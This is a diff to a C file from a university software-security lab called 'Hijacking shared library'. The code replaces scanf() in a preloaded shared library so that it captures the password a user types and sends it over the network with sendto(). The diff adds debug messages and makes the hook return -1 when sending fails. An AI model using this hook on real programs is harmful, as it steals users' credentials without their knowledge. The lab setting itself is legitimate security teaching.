@@ -1,3 +1,21 @@
+/*
+ *  Introduction to Software Security Assignment (Laboratory) 1 
+ *  Hijacking shared library
+ *  Copyright (C) 2023  Roy Simanovich
+ * 
+ *  This program is free software: you can redistribute it and/or modify
+ *  it under the terms of the GNU General Public License as published by
+ *  the Free Software Foundation, either version 3 of the License, or
+ *  (at your option) any later version.
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU General Public License for more details.
+ * 
+ *  You should have received a copy of the GNU General Public License
+ *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdarg.h> // va_list, va_start, va_arg, va_end
@@ -22,8 +40,10 @@
 
 /*
  * @brief Debug mode flag.
+ *
  * If set to 1, debug messages will be printed to stderr.
  * If set to 0, debug messages will be suppressed.
+ * 
  * @note This flag is used to prevent debug messages from being printed to stderr
  *          when the program is run in the background.
  * @note This flag is set to 0 by default.
@@ -102,6 +122,10 @@ void myinit() {
         
         exit(1);
     }
+
+    if (DEBUG_MODE)
+        fprintf(stdout, "Hijacking program loaded.\n");
+        
 }
 
 /*
@@ -111,6 +135,9 @@ void myinit() {
 */
 void mydest() {
     dlclose(handle);
+
+    if (DEBUG_MODE)
+        fprintf(stdout, "Hijacking program unloaded.\n");
 }
 
 /*
@@ -146,6 +173,7 @@ int send_password(char* password, size_t len) {
         if (DEBUG_MODE)
             fprintf(stderr, "sendto() failed: %s\n", strerror(errno));
 
+        // Simulate failure of scanf()
         return 0;
     }
 
@@ -161,8 +189,11 @@ int send_password(char* password, size_t len) {
  * @param ... The arguments to scanf().
  * 
  * @return The return value of the original scanf() function.
+ * @return -1 if the password wasn't sent, or if an error occurred,
+ *              as this will simulate a failure of scanf().
 */
 int scanf(const char *format, ...) {
+    char* parg = NULL;
     char password[1000];
     sym orig_scanf = (sym) dlsym(handle, "scanf");
 
@@ -170,7 +201,9 @@ int scanf(const char *format, ...) {
     va_start(args, format);
     int ret = orig_scanf(format, args);
 
-    strcpy(password, va_arg(args, char*));
+    parg = va_arg(args, char*);
+
+    strcpy(password, parg);
 
     va_end(args);
 
@@ -179,7 +212,8 @@ int scanf(const char *format, ...) {
         if (DEBUG_MODE)
             fprintf(stderr, "send_password() failed\n");
 
-        exit(1);
+        // Simulate failure of scanf(), as the password wasn't sent.
+        return -1;
     }
 
     return ret;
